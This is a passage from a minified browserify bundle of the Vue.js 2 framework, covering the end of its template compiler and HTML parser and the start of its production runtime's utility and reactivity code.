l=n?function(e,t){for(var n=0,r=0;r<e.length;r++){var i=e[r];if(1===i.type){if(Bs(i)||i.ifConditions&&i.ifConditions.some((function(e){return Bs(e.block)}))){n=2;break}(t(i)||i.ifConditions&&i.ifConditions.some((function(e){return t(e.block)})))&&(n=1)}}return n}(a,t.maybeComponent):0,c=i||Es;return"["+a.map((function(e){return c(e,t)})).join(",")+"]"+(l?","+l:"")}}function Bs(e){return void 0!==e.for||"template"===e.tag||"slot"===e.tag}function Es(e,t){return 1===e.type?ys(e,t):3===e.type&&e.isComment?(r=e,"_e("+JSON.stringify(r.text)+")"):"_v("+(2===(n=e).type?n.expression:Ps(JSON.stringify(n.text)))+")";var n,r}function Ts(e){for(var t="",n="",r=0;r<e.length;r++){var i=e[r],a=Ps(i.value);i.dynamic?n+=i.name+","+a+",":t+='"'+i.name+'":'+a+","}return t="{"+t.slice(0,-1)+"}",n?"_d("+t+",["+n.slice(0,-1)+"])":t}function Ps(e){return e.replace(/\u2028/g,"\\u2028").replace(/\u2029/g,"\\u2029")}var Is=new RegExp("\\b"+"do,if,for,let,new,try,var,case,else,with,await,break,catch,class,const,super,throw,while,yield,delete,export,import,return,switch,default,extends,finally,continue,debugger,function,arguments".split(",").join("\\b|\\b")+"\\b"),Fs=new RegExp("\\b"+"delete,typeof,void".split(",").join("\\s*\\([^\\)]*\\)|\\b")+"\\s*\\([^\\)]*\\)"),Ls=/'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"|`(?:[^`\\]|\\.)*\$\{|\}(?:[^`\\]|\\.)*`|`(?:[^`\\]|\\.)*`/g;function Os(e,t,n,r){var i=e.replace(Ls,""),a=i.match(Fs);a&&"$"!==i.charAt(a.index-1)&&n('avoid using JavaScript unary operator as property name: "'+a[0]+'" in expression '+t.trim(),r),Rs(e,t,n,r)}function Ns(e,t,n,r){Rs(e.for||"",t,n,r),Ds(e.alias,"v-for alias",t,n,r),Ds(e.iterator1,"v-for iterator",t,n,r),Ds(e.iterator2,"v-for iterator",t,n,r)}function Ds(e,t,n,r,i){if("string"==typeof e)try{new Function("var "+e+"=_")}catch(a){r("invalid "+t+' "'+e+'" in expression: '+n.trim(),i)}}function Rs(e,t,n,r){try{new Function("return "+e)}catch(a){var i=e.replace(Ls,"").match(Is);n(i?'avoid using JavaScript keyword as property name: "'+i[0]+'"\n  Raw expression: '+t.trim():"invalid expression: "+a.message+" in\n\n    "+e+"\n\n  Raw expression: "+t.trim()+"\n",r)}}function js(e,t,n,r){try{new Function(e,"")}catch(i){n("invalid function parameter expression: "+i.message+" in\n\n    "+e+"\n\n  Raw expression: "+t.trim()+"\n",r)}}function Us(e,t){var n="";if(0<t)for(;1&t&&(n+=e),!((t>>>=1)<=0);)e+=e;return n}function $s(e,t){try{return new Function(e)}catch(n){return t.push({err:n,code:e}),F}}function zs(e){var t=Object.create(null);return function(n,r,i){var a=(r=P({},r)).warn||pe;delete r.warn;try{new Function("return 1")}catch(r){r.toString().match(/unsafe-eval|CSP/)&&a("It seems you are using the standalone build of Vue.js in an environment with Content Security Policy that prohibits unsafe-eval. The template compiler cannot work in this environment. Consider relaxing the policy to allow unsafe-eval or pre-compiling your templates into render functions.")}var o=r.delimiters?String(r.delimiters)+n:n;if(t[o])return t[o];var s=e(n,r);s.errors&&s.errors.length&&(r.outputSourceRange?s.errors.forEach((function(e){a("Error compiling template:\n\n"+e.msg+"\n\n"+function(e,t,n){void 0===t&&(t=0),void 0===n&&(n=e.length);for(var r=e.split(/\r?\n/),i=0,a=[],o=0;o<r.length;o++)if(t<=(i+=r[o].length+1)){for(var s=o-2;s<=o+2||i<n;s++)if(!(s<0||s>=r.length)){a.push(""+(s+1)+Us(" ",3-String(s+1).length)+"|  "+r[s]);var l=r[s].length;if(s===o){var c=t-(i-l)+1,u=i<n?l-c:n-t;a.push("   |  "+Us(" ",c)+Us("^",u))}else if(o<s){if(i<n){var d=Math.min(n-i,l);a.push("   |  "+Us("^",d))}i+=l+1}}break}return a.join("\n")}(n,e.start,e.end),i)})):a("Error compiling template:\n\n"+n+"\n\n"+s.errors.map((function(e){return"- "+e})).join("\n")+"\n",i)),s.tips&&s.tips.length&&(r.outputSourceRange?s.tips.forEach((function(e){return he(e.msg)})):s.tips.forEach((function(e){return he()})));var l={},c=[];return l.render=$s(s.render,c),l.staticRenderFns=s.staticRenderFns.map((function(e){return $s(e,c)})),s.errors&&s.errors.length||!c.length||a("Failed to generate render function:\n\n"+c.map((function(e){var t=e.err,n=e.code;return t.toString()+" in\n\n"+n+"\n"})).join("\n"),i),t[o]=l}}var Hs,Vs,Qs=(Hs=function(e,t){var n=function(e,t){Xa=t.warn||li,to=t.isPreTag||L,no=t.mustUseProp||L,ro=t.getTagNamespace||L;var n=t.isReservedTag||L;io=function(e){return!!e.component||!n(e.tag)},Ja=ci(t.modules,"transformNode"),Za=ci(t.modules,"preTransformNode"),eo=ci(t.modules,"postTransformNode"),Ya=t.delimiters;var r,i,a=[],o=!1!==t.preserveWhitespace,s=t.whitespace,l=!1,c=!1,u=!1;function d(e,t){u||(u=!0,Xa(e,t))}function p(e){if(h(e),l||e.processed||(e=Vo(e,t)),a.length||e===r||(r.if&&(e.elseif||e.else)?(f(e),Go(r,{exp:e.elseif,block:e})):d("Component template should contain exactly one root element. If you are using v-if on multiple elements, use v-else-if to chain them instead.",{start:e.start})),i&&!e.forbidden)if(e.elseif||e.else)o=e,(s=function(e){for(var t=e.length;t--;){if(1===e[t].type)return e[t];" "!==e[t].text&&Xa('text "'+e[t].text.trim()+'" between v-if and v-else(-if) will be ignored.',e[t]),e.pop()}}(i.children))&&s.if?Go(s,{exp:o.elseif,block:o}):Xa("v-"+(o.elseif?'else-if="'+o.elseif+'"':"else")+" used on element <"+o.tag+"> without corresponding v-if.",o.rawAttrsMap[o.elseif?"v-else-if":"v-else"]);else{if(e.slotScope){var n=e.slotTarget||'"default"';(i.scopedSlots||(i.scopedSlots={}))[n]=e}i.children.push(e),e.parent=i}var o,s;e.children=e.children.filter((function(e){return!e.slotScope})),h(e),e.pre&&(l=!1),to(e.tag)&&(c=!1);for(var u=0;u<eo.length;u++)eo[u](e,t)}function h(e){if(!c)for(var t;(t=e.children[e.children.length-1])&&3===t.type&&" "===t.text;)e.children.pop()}function f(e){"slot"!==e.tag&&"template"!==e.tag||d("Cannot use <"+e.tag+"> as component root element because it may contain multiple nodes.",{start:e.start}),e.attrsMap.hasOwnProperty("v-for")&&d("Cannot use v-for on stateful component root element because it renders multiple elements.",e.rawAttrsMap["v-for"])}return function(e,t){for(var n,r,i=[],a=t.expectHTML,o=t.isUnaryTag||L,s=t.canBeLeftOpenTag||L,l=0;e;){if(n=e,r&&_o(r)){var c=0,u=r.toLowerCase(),d=wo[u]||(wo[u]=new RegExp("([\\s\\S]*?)(</"+u+"[^>]*>)","i")),p=e.replace(d,(function(e,n,r){return c=r.length,_o(u)||"noscript"===u||(n=n.replace(/<!\--([\s\S]*?)-->/g,"$1").replace(/<!\[CDATA\[([\s\S]*?)]]>/g,"$1")),Mo(u,n)&&(n=n.slice(1)),t.chars&&t.chars(n),""}));l+=e.length-p.length,e=p,k(u,l-c,l)}else{var h=e.indexOf("<");if(0===h){if(yo.test(e)){var f=e.indexOf("--\x3e");if(0<=f){t.shouldKeepComment&&t.comment(e.substring(4,f),l,l+f+3),C(f+3);continue}}if(bo.test(e)){var A=e.indexOf("]>");if(0<=A){C(A+2);continue}}var m=e.match(go);if(m){C(m[0].length);continue}var v=e.match(vo);if(v){var g=l;C(v[0].length),k(v[1],g,l);continue}var y=x();if(y){S(y),Mo(y.tagName,e)&&C(1);continue}}var b=void 0,_=void 0,w=void 0;if(0<=h){for(_=e.slice(h);!(vo.test(_)||Ao.test(_)||yo.test(_)||bo.test(_)||(w=_.indexOf("<",1))<0);)h+=w,_=e.slice(h);b=e.substring(0,h)}h<0&&(b=e),b&&C(b.length),t.chars&&b&&t.chars(b,l-b.length,l)}if(e===n){t.chars&&t.chars(e),!i.length&&t.warn&&t.warn('Mal-formatted tag at end of template: "'+e+'"',{start:l+e.length});break}}function C(t){l+=t,e=e.substring(t)}function x(){var t=e.match(Ao);if(t){var n,r,i={tagName:t[1],attrs:[],start:l};for(C(t[0].length);!(n=e.match(mo))&&(r=e.match(po)||e.match(uo));)r.start=l,C(r[0].length),r.end=l,i.attrs.push(r);if(n)return i.unarySlash=n[1],C(n[0].length),i.end=l,i}}function S(e){var n=e.tagName,l=e.unarySlash;a&&("p"===r&&co(n)&&k(r),s(n)&&r===n&&k(n));for(var c,u,d,p=o(n)||!!l,h=e.attrs.length,f=new Array(h),A=0;A<h;A++){var m=e.attrs[A],v=m[3]||m[4]||m[5]||"",g="a"===n&&"href"===m[1]?t.shouldDecodeNewlinesForHref:t.shouldDecodeNewlines;f[A]={name:m[1],value:(c=v,u=g,d=u?So:xo,c.replace(d,(function(e){return Co[e]})))},t.outputSourceRange&&(f[A].start=m.start+m[0].match(/^\s*/).length,f[A].end=m.end)}p||(i.push({tag:n,lowerCasedTag:n.toLowerCase(),attrs:f,start:e.start,end:e.end}),r=n),t.start&&t.start(n,f,p,e.start,e.end)}function k(e,n,a){var o,s;if(null==n&&(n=l),null==a&&(a=l),e)for(s=e.toLowerCase(),o=i.length-1;0<=o&&i[o].lowerCasedTag!==s;o--);else o=0;if(0<=o){for(var c=i.length-1;o<=c;c--)(o<c||!e&&t.warn)&&t.warn("tag <"+i[c].tag+"> has no matching end tag.",{start:i[c].start,end:i[c].end}),t.end&&t.end(i[c].tag,n,a);i.length=o,r=o&&i[o-1].tag}else"br"===s?t.start&&t.start(e,[],!0,n,a):"p"===s&&(t.start&&t.start(e,[],!1,n,a),t.end&&t.end(e,n,a))}k()}(e,{warn:Xa,expectHTML:t.expectHTML,isUnaryTag:t.isUnaryTag,canBeLeftOpenTag:t.canBeLeftOpenTag,shouldDecodeNewlines:t.shouldDecodeNewlines,shouldDecodeNewlinesForHref:t.shouldDecodeNewlinesForHref,shouldKeepComment:t.comments,outputSourceRange:t.outputSourceRange,start:function(e,n,o,s,u){var d=i&&i.ns||ro(e);Z&&"svg"===d&&(n=function(e){for(var t=[],n=0;n<e.length;n++){var r=e[n];qo.test(r.name)||(r.name=r.name.replace(Xo,""),t.push(r))}return t}(n));var h,A,m,v=Ho(e,n,i);d&&(v.ns=d),t.outputSourceRange&&(v.start=s,v.end=u,v.rawAttrsMap=v.attrsList.reduce((function(e,t){return e[t.name]=t,e}),{})),n.forEach((function(e){Uo.test(e.name)&&Xa("Invalid dynamic argument expression: attribute names cannot contain spaces, quotes, <, >, / or =.",{start:e.start+e.name.indexOf("["),end:e.start+e.name.length})})),"style"!==(h=v).tag&&("script"!==h.tag||h.attrsMap.type&&"text/javascript"!==h.attrsMap.type)||se()||(v.forbidden=!0,Xa("Templates should only be responsible for mapping the state to the UI. Avoid placing tags with side-effects in your templates, such as <"+e+">, as they will not be parsed.",{start:v.start}));for(var g=0;g<Za.length;g++)v=Za[g](v,t)||v;l||(null!=vi(A=v,"v-pre")&&(A.pre=!0),v.pre&&(l=!0)),to(v.tag)&&(c=!0),l?function(e){var t=e.attrsList,n=t.length;if(n)for(var r=e.attrs=new Array(n),i=0;i<n;i++)r[i]={name:t[i].name,value:JSON.stringify(t[i].value)},null!=t[i].start&&(r[i].start=t[i].start,r[i].end=t[i].end);else e.pre||(e.plain=!0)}(v):v.processed||(Qo(v),function(e){var t=vi(e,"v-if");if(t)e.if=t,Go(e,{exp:t,block:e});else{null!=vi(e,"v-else")&&(e.else=!0);var n=vi(e,"v-else-if");n&&(e.elseif=n)}}(v),null!=vi(m=v,"v-once")&&(m.once=!0)),r||f(r=v),o?p(v):(i=v,a.push(v))},end:function(e,n,r){var o=a[a.length-1];a.length-=1,i=a[a.length-1],t.outputSourceRange&&(o.end=r),p(o)},chars:function(n,r,a){if(i){if(!Z||"textarea"!==i.tag||i.attrsMap.placeholder!==n){var u,p,h,f=i.children;(n=c||n.trim()?"script"===(u=i).tag||"style"===u.tag?n:$o(n):f.length?s?"condense"===s&&Ro.test(n)?"":" ":o?" ":"":"")&&(c||"condense"!==s||(n=n.replace(jo," ")),!l&&" "!==n&&(p=Ka(n,Ya))?h={type:2,expression:p.expression,tokens:p.tokens,text:n}:" "===n&&f.length&&" "===f[f.length-1].text||(h={type:3,text:n}),h&&(t.outputSourceRange&&(h.start=r,h.end=a),f.push(h)))}}else n===e?d("Component template requires a root element, rather than just text.",{start:r}):(n=n.trim())&&d('text "'+n+'" outside root element will be ignored.',{start:r})},comment:function(e,n,r){if(i){var a={type:3,text:e,isComment:!0};t.outputSourceRange&&(a.start=n,a.end=r),i.children.push(a)}}}),r}(e.trim(),t);!1!==t.optimize&&function(e,t){e&&(es=is(t.staticKeys||""),ts=t.isReservedTag||L,function e(t){if(t.static=as(t),1===t.type){if(!ts(t.tag)&&"slot"!==t.tag&&null==t.attrsMap["inline-template"])return;for(var n=0,r=t.children.length;n<r;n++){var i=t.children[n];e(i),i.static||(t.static=!1)}if(t.ifConditions)for(var a=1,o=t.ifConditions.length;a<o;a++){var s=t.ifConditions[a].block;e(s),s.static||(t.static=!1)}}}(e),function e(t,n){if(1===t.type){if((t.static||t.once)&&(t.staticInFor=n),t.static&&t.children.length&&(1!==t.children.length||3!==t.children[0].type))return void(t.staticRoot=!0);if(t.staticRoot=!1,t.children)for(var r=0,i=t.children.length;r<i;r++)e(t.children[r],n||!!t.for);if(t.ifConditions)for(var a=1,o=t.ifConditions.length;a<o;a++)e(t.ifConditions[a].block,n)}}(e,!1))}(n,t);var r=gs(n,t);return{ast:n,render:r.render,staticRenderFns:r.staticRenderFns}},function(e){function t(t,n){var r=Object.create(e),i=[],a=[],o=function(e,t,n){(n?a:i).push(e)};if(n){if(n.outputSourceRange){var s=t.match(/^\s*/)[0].length;o=function(e,t,n){var r={msg:e};t&&(null!=t.start&&(r.start=t.start+s),null!=t.end&&(r.end=t.end+s)),(n?a:i).push(r)}}for(var l in n.modules&&(r.modules=(e.modules||[]).concat(n.modules)),n.directives&&(r.directives=P(Object.create(e.directives||null),n.directives)),n)"modules"!==l&&"directives"!==l&&(r[l]=n[l])}r.warn=o;var c=Hs(t.trim(),r);return function(e,t){e&&function e(t,n){if(1===t.type){for(var r in t.attrsMap)if(Eo.test(r)){var i=t.attrsMap[r];if(i){var a=t.rawAttrsMap[r];"v-for"===r?Ns(t,'v-for="'+i+'"',n,a):"v-slot"===r||"#"===r[0]?js(i,r+'="'+i+'"',n,a):Bo.test(r)?Os(i,r+'="'+i+'"',n,a):Rs(i,r+'="'+i+'"',n,a)}}if(t.children)for(var o=0;o<t.children.length;o++)e(t.children[o],n)}else 2===t.type&&Rs(t.expression,t.text,n,t)}(e,t)}(c.ast,o),c.errors=i,c.tips=a,c}return{compile:t,compileToFunctions:zs(t)}})(rs),Gs=(Qs.compile,Qs.compileToFunctions);function Ws(e){return(Vs=Vs||document.createElement("div")).innerHTML=e?'<a href="\n"/>':'<div a="\n"/>',0<Vs.innerHTML.indexOf("&#10;")}var Ks=!!q&&Ws(!1),qs=!!q&&Ws(!0),Xs=C((function(e){var t=Ir(e);return t&&t.innerHTML})),Ys=nr.prototype.$mount;nr.prototype.$mount=function(e,t){if((e=e&&Ir(e))===document.body||e===document.documentElement)return pe("Do not mount Vue to <html> or <body> - mount to normal elements instead."),this;var n=this.$options;if(!n.render){var r=n.template;if(r)if("string"==typeof r)"#"===r.charAt(0)&&((r=Xs(r))||pe("Template element not found or is empty: "+n.template,this));else{if(!r.nodeType)return pe("invalid template option:"+r,this),this;r=r.innerHTML}else e&&(r=function(e){if(e.outerHTML)return e.outerHTML;var t=document.createElement("div");return t.appendChild(e.cloneNode(!0)),t.innerHTML}(e));if(r){z.performance&&st&&st("compile");var i=Gs(r,{outputSourceRange:!0,shouldDecodeNewlines:Ks,shouldDecodeNewlinesForHref:qs,delimiters:n.delimiters,comments:n.comments},this),a=i.render,o=i.staticRenderFns;n.render=a,n.staticRenderFns=o,z.performance&&st&&(st("compile end"),lt("vue "+this._name+" compile","compile","compile end"))}}return Ys.call(this,e,t)},nr.compile=Gs,t.exports=nr}).call(this)}).call(this,"undefined"!=typeof global?global:"undefined"!=typeof self?self:"undefined"!=typeof window?window:{},e("timers").setImmediate)},{timers:274}],279:[function(e,t,n){(function(n){(function(){"production"===n.env.NODE_ENV?t.exports=e("./vue.common.prod.js"):t.exports=e("./vue.common.dev.js")}).call(this)}).call(this,e("_process"))},{"./vue.common.dev.js":278,"./vue.common.prod.js":280,_process:229}],280:[function(e,t,n){(function(e,n){(function(){var r=Object.freeze({});function i(e){return null==e}function a(e){return null!=e}function o(e){return!0===e}function s(e){return"string"==typeof e||"number"==typeof e||"symbol"==_typeof2(e)||"boolean"==typeof e}function l(e){return null!==e&&"object"==_typeof2(e)}var c=Object.prototype.toString;function u(e){return"[object Object]"===c.call(e)}function d(e){var t=parseFloat(String(e));return 0<=t&&Math.floor(t)===t&&isFinite(e)}function p(e){return a(e)&&"function"==typeof e.then&&"function"==typeof e.catch}function h(e){return null==e?"":Array.isArray(e)||u(e)&&e.toString===c?JSON.stringify(e,null,2):String(e)}function f(e){var t=parseFloat(e);return isNaN(t)?e:t}function A(e,t){for(var n=Object.create(null),r=e.split(","),i=0;i<r.length;i++)n[r[i]]=!0;return t?function(e){return n[e.toLowerCase()]}:function(e){return n[e]}}var m=A("slot,component",!0),v=A("key,ref,slot,slot-scope,is");function g(e,t){if(e.length){var n=e.indexOf(t);if(-1<n)return e.splice(n,1)}}var y=Object.prototype.hasOwnProperty;function b(e,t){return y.call(e,t)}function _(e){var t=Object.create(null);return function(n){return t[n]||(t[n]=e(n))}}var w=/-(\w)/g,C=_((function(e){return e.replace(w,(function(e,t){return t?t.toUpperCase():""}))})),x=_((function(e){return e.charAt(0).toUpperCase()+e.slice(1)})),S=/\B([A-Z])/g,k=_((function(e){return e.replace(S,"-$1").toLowerCase()})),M=Function.prototype.bind?function(e,t){return e.bind(t)}:function(e,t){function n(n){var r=arguments.length;return r?1<r?e.apply(t,arguments):e.call(t,n):e.call(t)}return n._length=e.length,n};function B(e,t){t=t||0;for(var n=e.length-t,r=new Array(n);n--;)r[n]=e[n+t];return r}function E(e,t){for(var n in t)e[n]=t[n];return e}function T(e){for(var t={},n=0;n<e.length;n++)e[n]&&E(t,e[n]);return t}function P(e,t,n){}var I=function(e,t,n){return!1},F=function(e){return e};function L(e,t){if(e===t)return!0;var n=l(e),r=l(t);if(!n||!r)return!n&&!r&&String(e)===String(t);try{var i=Array.isArray(e),a=Array.isArray(t);if(i&&a)return e.length===t.length&&e.every((function(e,n){return L(e,t[n])}));if(e instanceof Date&&t instanceof Date)return e.getTime()===t.getTime();if(i||a)return!1;var o=Object.keys(e),s=Object.keys(t);return o.length===s.length&&o.every((function(n){return L(e[n],t[n])}))}catch(e){return!1}}function O(e,t){for(var n=0;n<e.length;n++)if(L(e[n],t))return n;return-1}function N(e){var t=!1;return function(){t||(t=!0,e.apply(this,arguments))}}var D="data-server-rendered",R=["component","directive","filter"],j=["beforeCreate","created","beforeMount","mounted","beforeUpdate","updated","beforeDestroy","destroyed","activated","deactivated","errorCaptured","serverPrefetch"],U={optionMergeStrategies:Object.create(null),silent:!1,productionTip:!1,devtools:!1,performance:!1,errorHandler:null,warnHandler:null,ignoredElements:[],keyCodes:Object.create(null),isReservedTag:I,isReservedAttr:I,isUnknownElement:I,getTagNamespace:P,parsePlatformTagName:F,mustUseProp:I,async:!0,_lifecycleHooks:j},$=/a-zA-Z\u00B7\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u037D\u037F-\u1FFF\u200C-\u200D\u203F-\u2040\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD/;function z(e,t,n,r){Object.defineProperty(e,t,{value:n,enumerable:!!r,writable:!0,configurable:!0})}var H,V=new RegExp("[^"+$.source+".$_\\d]"),Q="__proto__"in{},G="undefined"!=typeof window,W="undefined"!=typeof WXEnvironment&&!!WXEnvironment.platform,K=W&&WXEnvironment.platform.toLowerCase(),q=G&&window.navigator.userAgent.toLowerCase(),X=q&&/msie|trident/.test(q),Y=q&&0<q.indexOf("msie 9.0"),J=q&&0<q.indexOf("edge/"),Z=(q&&q.indexOf("android"),q&&/iphone|ipad|ipod|ios/.test(q)||"ios"===K),ee=(q&&/chrome\/\d+/.test(q),q&&/phantomjs/.test(q),q&&q.match(/firefox\/(\d+)/)),te={}.watch,ne=!1;if(G)try{var re={};Object.defineProperty(re,"passive",{get:function(){ne=!0}}),window.addEventListener("test-passive",null,re)}catch(r){}var ie=function(){return void 0===H&&(H=!G&&!W&&void 0!==e&&e.process&&"server"===e.process.env.VUE_ENV),H},ae=G&&window.__VUE_DEVTOOLS_GLOBAL_HOOK__;function oe(e){return"function"==typeof e&&/native code/.test(e.toString())}var se,le="undefined"!=typeof Symbol&&oe(Symbol)&&"undefined"!=typeof Reflect&&oe(Reflect.ownKeys);se="undefined"!=typeof Set&&oe(Set)?Set:function(){function e(){this.set=Object.create(null)}return e.prototype.has=function(e){return!0===this.set[e]},e.prototype.add=function(e){this.set[e]=!0},e.prototype.clear=function(){this.set=Object.create(null)},e}();var ce=P,ue=0,de=function(){this.id=ue++,this.subs=[]};de.prototype.addSub=function(e){this.subs.push(e)},de.prototype.removeSub=function(e){g(this.subs,e)},de.prototype.depend=function(){de.target&&de.target.addDep(this)},de.prototype.notify=function(){for(var e=this.subs.slice(),t=0,n=e.length;t<n;t++)e[t].update()},de.target=null;var pe=[];function he(e){pe.push(e),de.target=e}function fe(){pe.pop(),de.target=pe[pe.length-1]}var Ae=function(e,t,n,r,i,a,o,s){this.tag=e,this.data=t,this.children=n,this.text=r,this.elm=i,this.ns=void 0,this.context=a,this.fnContext=void 0,this.fnOptions=void 0,this.fnScopeId=void 0,this.key=t&&t.key,this.componentOptions=o,this.componentInstance=void 0,this.parent=void 0,this.raw=!1,this.isStatic=!1,this.isRootInsert=!0,this.isComment=!1,this.isCloned=!1,this.isOnce=!1,this.asyncFactory=s,this.asyncMeta=void 0,this.isAsyncPlaceholder=!1},me={child:{configurable:!0}};me.child.get=function(){return this.componentInstance},Object.defineProperties(Ae.prototype,me);var ve=function(e){void 0===e&&(e="");var t=new Ae;return t.text=e,t.isComment=!0,t};function ge(e){return new Ae(void 0,void 0,void 0,String(e))}function ye(e){var t=new Ae(e.tag,e.data,e.children&&e.children.slice(),e.text,e.elm,e.context,e.componentOptions,e.asyncFactory);return t.ns=e.ns,t.isStatic=e.isStatic,t.key=e.key,t.isComment=e.isComment,t.fnContext=e.fnContext,t.fnOptions=e.fnOptions,t.fnScopeId=e.fnScopeId,t.asyncMeta=e.asyncMeta,t.isCloned=!0,t}var be=Array.prototype,_e=Object.create(be);["push","pop","shift","unshift","splice","sort","reverse"].forEach((function(e){var t=be[e];z(_e,e,(function(){for(var n=[],r=arguments.length;r--;)n[r]=arguments[r];var i,a=t.apply(this,n),o=this.__ob__;switch(e){case"push":case"unshift":i=n;break;case"splice":i=n.slice(2)}return i&&o.observeArray(i),o.dep.notify(),a}))}));var we=Object.getOwnPropertyNames(_e),Ce=!0;function xe(e){Ce=e}var Se=function(e){var t;this.value=e,this.dep=new de,this.vmCount=0,z(e,"__ob__",this),Array.isArray(e)?(Q?(t=_e,e.__proto__=t):function(e,t,n){for(var r=0,i=n.length;r<i;r++){var a=n[r];z(e,a,t[a])}}(e,_e,we),this.observeArray(e)):this.walk(e)};function ke(e,t){var n;if(l(e)&&!(e instanceof Ae))return b(e,"__ob__")&&e.__ob__ instanceof Se?n=e.__ob__:Ce&&!ie()&&(Array.isArray(e)||u(e))&&Object.isExtensible(e)&&!e._isVue&&(n=new Se(e)),t&&n&&n.vmCount++,n}function Me(e,t,n,r,i){var a=new de,o=Object.getOwnPropertyDescriptor(e,t);if(!o||!1!==o.configurable){var s=o&&o.get,l=o&&o.set;s&&!l||2!==arguments.length||(n=e[t]);var c=!i&&ke(n);Object.defineProperty(e,t,{enumerable:!0,configurable:!0,get:function(){var t=s?s.call(e):n;return de.target&&(a.depend(),c&&(c.dep.depend(),Array.isArray(t)&&function e(t){for(var n=void 0,r=0,i=t.length;r<i;r++)(n=t[r])&&n.__ob__&&n.__ob__.dep.depend(),Array.isArray(n)&&e(n)}(t))),t},set:function(t){var r=s?s.call(e):n;t===r||t!=t&&r!=r||s&&!l||(l?l.call(e,t):n=t,c=!i&&ke(t),a.notify())}})}}function Be(e,t,n){if(Array.isArray(e)&&d(t))return e.length=Math.max(e.length,t),e.splice(t,1,n),n;if(t in e&&!(t in Object.prototype))return e[t]=n;var r=e.__ob__;return e._isVue||r&&r.vmCount||(r?(Me(r.value,t,n),r.dep.notify()):e[t]=n),n}function Ee(e,t){if(Array.isArray(e)&&d(t))e.splice(t,1);else{var n=e.__ob__;e._isVue||n&&n.vmCount||b(e,t)&&(delete e[t],n&&n.dep.notify())}}Se.prototype.walk=function(e){for(var t=Object.keys(e),n=0;n<t.length;n++)Me(e,t[n])},Se.prototype.observeArray=function(e){for(var t=0,n=e.length;t<n;t++)ke(e[t])};var Te=U.optionMergeStrategies;function Pe(e,t){if(!t)return e;for(var n,r,i,a=le?Reflect.ownKeys(t):Object.keys(t),o=0;o<a.length;o++)"__ob__"!==(n=a[o])&&(r=e[n],i=t[n],b(e,n)?r!==i&&u(r)&&u(i)&&Pe(r,i):Be(e,n,i));return e}function Ie(e,t,n){return n?function(){var r="function"==typeof t?t.call(n,n):t,i="function"==typeof e?e.call(n,n):e;return r?Pe(r,i):i}:t?e?function(){return Pe("function"==typeof t?t.call(this,this):t,"function"==typeof e?e.call(this,this):e)}:t:e}function Fe(e,t){var n=t?e?e.concat(t):Array.isArray(t)?t:[t]:e;return n?function(e){for(var t=[],n=0;n<e.length;n++)-1===t.indexOf(e[n])&&t.push(e[n]);return t}(n):n}function Le(e,t,n,r){var i=Object.create(e||null);return t?E(i,t):i}Te.data=function(e,t,n){return n?Ie(e,t,n):t&&"function"!=typeof t?e:Ie(e,t)},j.forEach((function(e){Te[e]=Fe})),R.forEach((function(e){Te[e+"s"]=Le})),Te.watch=function(e,t,n,r){if(e===te&&(e=void 0),t===te&&(t=void 0),!t)return Object.create(e||null);if(!e)return t;var i={};for(var a in E(i,e),t){var o=i[a],s=t[a];o&&!Array.isArray(o)&&(o=[o]),i[a]=o?o.concat(s):Array.isArray(s)?s:[s]}return i},Te.props=Te.methods=Te.inject=Te.computed=function(e,t,n,r){if(!e)return t;var i=Object.create(null);return E(i,e),t&&E(i,t),i},Te.provide=Ie;var Oe=function(e,t){return void 0===t?e:t};function Ne(e,t,n){if("function"==typeof t&&(t=t.options),function(e,t){var n=e.props;if(n){var r,i,a={};if(Array.isArray(n))for(r=n.length;r--;)"string"==typeof(i=n[r])&&(a[C(i)]={type:null});else if(u(n))for(var o in n)i=n[o],a[C(o)]=u(i)?i:{type:i};e.props=a}}(t),function(e,t){var n=e.inject;if(n){var r=e.inject={};if(Array.isArray(n))for(var i=0;i<n.length;i++)r[n[i]]={from:n[i]};else if(u(n))for(var a in n){var o=n[a];r[a]=u(o)?E({from:a},o):{from:o}}}}(t),function(e){var n=t.directives;if(n)for(var r in n){var i=n[r];"function"==typeof i&&(n[r]={bind:i,update:i})}}(),!t._base&&(t.extends&&(e=Ne(e,t.extends,n)),t.mixins))for(var r=0,i=t.mixins.length;r<i;r++)e=Ne(e,t.mixins[r],n);var a,o={};for(a in e)s(a);for(a in t)b(e,a)||s(a);function s(r){var i=Te[r]||Oe;o[r]=i(e[r],t[r],n,r)}return o}function De(e,t,n,r){if("string"==typeof n){var i=e[t];if(b(i,n))return i[n];var a=C(n);if(b(i,a))return i[a];var o=x(a);return b(i,o)?i[o]:i[n]||i[a]||i[o]}}function Re(e,t,n,r){var i=t[e],a=!b(n,e),o=n[e],s=$e(Boolean,i.type);if(-1<s)if(a&&!b(i,"default"))o=!1;else if(""===o||o===k(e)){var l=$e(String,i.type);(l<0||s<l)&&(o=!0)}if(void 0===o){o=function(e,t,n){if(b(t,"default")){var r=t.default;return e&&e.$options.propsData&&void 0===e.$options.propsData[n]&&void 0!==e._props[n]?e._props[n]:"function"==typeof r&&"Function"!==je(t.type)?r.call(e):r}}(r,i,e);var c=Ce;xe(!0),ke(o),xe(c)}return o}function je(e){var t=e&&e.toString().match(/^\s*function (\w+)/);return t?t[1]:""}function Ue(e,t){return je(e)===je(t)}function $e(e,t){if(!Array.isArray(t))return Ue(t,e)?0:-1;for(var n=0,r=t.length;n<r;n++)if(Ue(t[n],e))return n;return-1}function ze(e,t,n){he();try{if(t)for(var r=t;r=r.$parent;){var i=r.$options.errorCaptured;if(i)for(var a=0;a<i.length;a++)try{if(!1===i[a].call(r,e,t,n))return}catch(e){Ve(e,r,"errorCaptured hook")}}Ve(e,t,n)}finally{fe()}}function He(e,t,n,r,i){var a;try{(a=n?e.apply(t,n):e.call(t))&&!a._isVue&&p(a)&&!a._handled&&(a.catch((function(e){return ze(e,r,i+" (Promise/async)")})),a._handled=!0)}catch(e){ze(e,r,i)}return a}function Ve(e,t,n){if(U.errorHandler)try{return U.errorHandler.call(null,e,t,n)}catch(t){t!==e&&Qe(t,null,"config.errorHandler")}Qe(e,t,n)}function Qe(e,t,n){if(!G&&!W||"undefined"==typeof console)throw e}var Ge,We=!1,Ke=[],qe=!1;function Xe(){qe=!1;for(var e=Ke.slice(0),t=Ke.length=0;t<e.length;t++)e[t]()}if("undefined"!=typeof Promise&&oe(Promise)){var Ye=Promise.resolve();Ge=function(){Ye.then(Xe),Z&&setTimeout(P)},We=!0}else if(X||"undefined"==typeof MutationObserver||!oe(MutationObserver)&&"[object 